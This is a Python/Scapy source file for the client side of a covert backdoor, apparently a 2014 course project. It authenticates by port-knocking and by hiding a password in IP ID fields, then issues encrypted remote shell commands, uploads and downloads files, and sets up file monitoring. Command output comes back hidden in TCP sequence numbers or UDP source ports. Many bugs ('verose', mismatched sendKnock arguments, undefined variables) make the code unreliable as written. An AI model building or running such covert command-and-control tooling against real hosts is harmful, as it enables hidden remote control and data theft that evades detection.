'''
--------------------------------------------------------------------------------------------
-- SCRIPT: doorsy-client.py
-- 
-- FUNCTIONS: main
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
from scapy.all import *
from encrypt import *
import os
import random

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: main
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: main()
-- 
-- RETURNS: void
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
protocol = "tcp"
def main():
	global protocol
	address = "127.0.0.1"
	port = 0
	password = ""
	knock = []
	warnings = ""

	# Making sure we're running in root
	if os.geteuid() != 0:
		print "Program must be run as root"
		return

	while True:
		os.system("clear")
		print warnings
		warnings = ""

		print "Server Address:  " + address
		print "Port: " + str(port)
		print "Password:        " + password
		print "Knock Sequence:  " + str(knock)
		print " "
		print "-Commands-"
		print "C - Communication Protocol (TCP/UDP)"
		print "A - change server address"
		print "D - change command port"
		print "P - change password"
		print "K - change knock sequence"
		print "R - Run Connection Sequence"
		print "Q - Exit program"
		print "Input Command: "

		choice = raw_input()
		if choice == 'C' or choice == 'C':
			print "Input the transport-later protocol to use: "
			proto = raw_input()
			if proto.uppercase == "TCP" or proto.uppercase == "UDP":
				protocol = proto.uppercase()
			else:
				warnings = warnings + "Supported protocols include TCP and UDP\n"
		elif choice == 'A' or choice == 'a':
			print "Input new server address: "
			address = raw_input()
		elif choice == 'D' or choice == 'd':
			print "Input new Port: "
			port = raw_input()
		elif choice == 'P' or choice == 'p':
			print "Input new Password: "
			password = raw_input()
		elif choice == 'K' or choice == 'k':
			print "Input new Port Knock sequence."
			print "Each port number should be comma deliminated: "
			ports = raw_input()
			knock[:] = []
			for port in ports.split(","):
				knock.append(int(port))
		elif choice == 'R' or choice == 'r':
			# Making sure we have at least 1 password or knock.
			# We need either a password or a knock in order for remote access to work
			if len(password) < 1 and len(knock) < 1:
				warnings = warnings + "Must have a password or knock sequence to connect to a server\n"
			else:
				try:
					sendKnock(address, password, knock)
					if checkAuthenticate(address, port):
						sendCommand(address, port)
				except KeyboardInterrupt:
					print "Shutting Down"
				continue
		elif choice == 'Q' or choice == "q":
			return
		else:
			warnings = warnings + "Invalid input\n"
		print "\n"

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: sendKnock
-- 
-- DATE: 2014-11-09
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: sendKnock(address, commandPort, password, knock)
--              address - The address of the server
--              commandPort - The port to which you want to send commands
--              password - The password, if any, which will be used to autheticate to the server
--              knock - The knock sequence, if any, which will be used to autheticate to the server
-- 
-- RETURNS: Returns true on successful connection, otherwise False
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def sendKnock(address, commandPort, password, knock):
	seq = random.randint(0, 16777215)
	idpass = random.randint(0, 127)

	if len(knock) < 1:
		for c in password:
			port = random.randint(0, 65535)
			if protocol == "TCP":
				knockPacket = IP(dst=address, id=(idpass<<8) + ord(c))/\
				              TCP(sport=commandPort, dport=port, seq=seq)
				seq += 1
			elif protocol == "UDP":
				knockPacket = IP(dst=address, id=(idpass<<8) + ord(c))/\
				              UDP(sport=commandPort, dport=port)

			idpass += 1

			send(knockPacket, verbose=0)
	else:
		ipid = random.randint(0, 65535)
		c = 0
		for port in knock:
			ipHead = IP(dst=address)
			if len(password) > 0 and c < len(password):
				ipHead.id = (idpass<<8) + ord(password[c])
				c += 1
				idpass += 1
				ipid = ipHead.id
			else:
				ipHead.id = ipid
				ipid += 1
			if protocol == "TCP":
				knockPacket = ipHead/\
				              TCP(sport=commandPort, dport=port, seq=seq)
				seq += 1
			elif protocol == "UDP":
				knockPacket = ipHead/\
				              UDP(sport=commandPort, dport=port)

			send(knockPacket, verbose=0)

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: checkAuthenticate
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: checkAuthenticate(address, port)
--              address - The address of the server
--              port - The port to which packets should be sent
-- 
-- RETURNS: Returns true on auth packet received, otherwise false
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def checkAuthenticate(address, port):
	packetFilter = ""
	packetFilter = protocol + " and ip src " + address
	
	packets = sniff(count=1, filter=packetFilter, timeout=30)

	if len(packets) == 0:
		return False
	else:
		if protocol == "TCP":
			port = packets[0][TCP].sport
		elif protocol == "UDP":
			port = packets[0][UDP].sport
		return True

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: sendCommand
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: sendCommand(address, port)
--              address - The address of the server
--              port - The port to which packets should be sent
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def sendCommand(address, port):
	warings = ""
	while True:
		os.system("clear")
		print warnings
		warnings = ""

		print "Connected to " + address
		print "-Server Commands-"
		print "U - Upload file"
		print "D - Download file"
		print "T - Terminal Command"
		print "I - iNotify*"
		print "K - Kill Server*"
		print "Note: These actions will terminate the client's connection to the server"
		print "Input Command: "

		choice = raw_input()
		if choice == 'U' or choice == 'u':
			print "Input file to upload: "
			sFile = raw_input()
			sendFile(address, port, sFile)
		elif choice == 'D' or choice == 'd':
			print "Input file to download: "
			gFile = raw_input()
			getFile(address, port, gFile)
		elif choice == 'T' or choice == 't':
			print "Input terminal command: "
			command = raw_input()
			terminal(address, port, command)
		elif choice == 'I' or choice == 'i':
			print "Input file or directory to be watched: "
			notice = raw_input()
			print "Input IP address of listening server which should receive iNotify results: "
			listener = raw_input()
			notify(address, port, notice, listener)
			return
		elif choice == 'K' or choice == 'k':
			print "Terminating Server..."
			kill(address, port)
			return
		else:
			warnings = warnings + "Invalid input\n"
		print "\n"

# --Server Codes--
#       A S F 
#       C Y I 
#       K N N Flag
# sFile 0 0 0 N/A
# gFile 1 0 0 A
# termi 0 1 0 S
# iNoti 1 1 0 AS
# Kill  0 0 1 F

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: sendFile
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: sendFile(address, port, sFile)
--              address - The address of the server
--              port - The port to which packets should be sent
--              sFile - The directory and file to be sent
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def sendFile(address, port, sFile):
	if protocol == "TCP":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215))/\
			            RAW(LOAD=encrypt(sFile))
		send(commandPacket, verose=0)
		with open(sFile, "r") as tFile:
			for line in tFile:
				commandPacket[IP].id = commandPacket[IP].id + 1
				commandPacket[TCP].seq = commandPacket[TCP].seq + 1
				commandPacket[RAW].load = encrypt(line)
				send(commandPacket, verbose=0)
		commandPacket[IP].id = commandPacket[IP].id + 1
		commandPacket[TCP].seq = commandPacket[TCP].seq + 1
		commandPacket[RAW].load = ""
		commandPacket[TCP].flags="F"
	elif protocol == "UDP":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            UDP(sport=(random.randint(0, 255)<<8) + 1, dport=port)/\
			            RAW(LOAD=encrypt(sFile))
		send(commandPacket, verose=0)
		with open(sFile, "r") as tFile:
			for line in tFile:
				commandPacket[IP].id = commandPacket[IP].id + 1
				commandPacket[RAW].load = encrypt(line)
				send(commandPacket, verbose=0)
		commandPacket[IP].id = commandPacket[IP].id + 1
		commandPacket[RAW].load = ""
		commandPacket[UDP].sport = 0
	send(commandPacket, verbose=0)

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: getFile
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: getFile(address, port, gFile)
--              address - The address of the server
--              port - The port to which packets should be sent
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def getFile(address, port, gFile):
	if protocol == "TCP":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="A")/\
			            RAW(load=encrypt(gFile))
	elif protocol == "UDP":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            UDP(sport=(random.randint(0, 255)<<8) + 2, dport=port)/\
			            RAW(load=encrypt(gFile))
	send(commandPacket, verose=0)

	with open(gFile, "w") as tFile:
		while True:
			dPacket = sniff(filter=protocol + " sport " + str(port) + " and ip src " + address, count=1, timeout=30)
			if len(dPacket) == 0:
				break
			if "F" in dPacket[0][TCP].flags:
				break
			tFile.write(dPacket[RAW].load)
'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: terminal
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: terminal(address, port, command)
--              address - The address of the server
--              port - The port to which packets should be sent
--              command - The terminal command which should be run
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def terminal(address, port, command):
	result = ""
	if protocol == "TCP":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="S")/\
			            RAW(load=encrypt(command))
		send(commandPacket, verose=0)
	
		while True:
			dPacket = sniff(filter="tcp sport " + str(port) + " and ip src " + address, count=1, timeout=30)
			if len(dPacket) == 0:
				break
			if "F" in dPacket[0][TCP].flags:
				break
			result = result + chr(0x000000FF^(dPacket[0][TCP].seq>>24))
			result = result + chr(0x000000FF^(dPacket[0][TCP].seq>>16))
			result = result + chr(0x000000FF^(dPacket[0][TCP].seq>>8))
			result = result + chr(0x000000FF^(dPacket[0][TCP].seq))
	elif protocol == "UDP":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            UDP(sport=(random.randint(0, 255)<<8) + 4, dport=port)/\
			            RAW(load=encrypt(command))
		send(commandPacket, verose=0)
	
		while True:
			dPacket = sniff(filter="udp sport " + str(port) + " and ip src " + address, count=1, timeout=30)
			if len(dPacket) == 0:
				break
			if dPacket[0][UDP].sport == 0:
				break
			result = result + chr(0x00FF^(dPacket[0][UDP].sport>>8))
			result = result + chr(0x00FF^(dPacket[0][UDP].sport))

	print encrypt(result)

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: notify
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: notify(address, port, notice, listener)
--              address - The address of the server
--              port - The port to which packets should be sent
--              notice - The file or directory which should be monitored
--              listener - Address of the listening server
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def notify(address, port, notice, listener):
	if protocol == "TCP":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="AS")/\
			            RAW(load=encrypt(notice + "\n" + listener))
	elif protocol == "UDP":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            UDP(sport=(random.randint(0, 255)<<8) + 8, dport=port)/\
			            RAW(load=encrypt(notice + "\n" + listener))
	send(commandPacket, verose=0)

'''
---------------------------------------------------------------------------------------------
-- 
-- FUNCTION: kill
-- 
-- DATE: 2014-11-14
-- 
-- DESIGNERS: John Payment
-- 
-- PROGRAMMER: John Payment
-- 
-- INTERFACE: kill(address, port)
--              address - The address of the server
--              port - The port to which packets should be sent
-- 
-- RETURNS: N/A
-- 
-- NOTES: 
-- 
---------------------------------------------------------------------------------------------
'''
def kill(address, port):
	if protocol == "TCP":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="F")
	elif protocol == "UDP":
		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
			            UDP(sport=(random.randint(0, 255)<<8) + 16, dport=port)
	send(commandPacket, verose=0)

main()

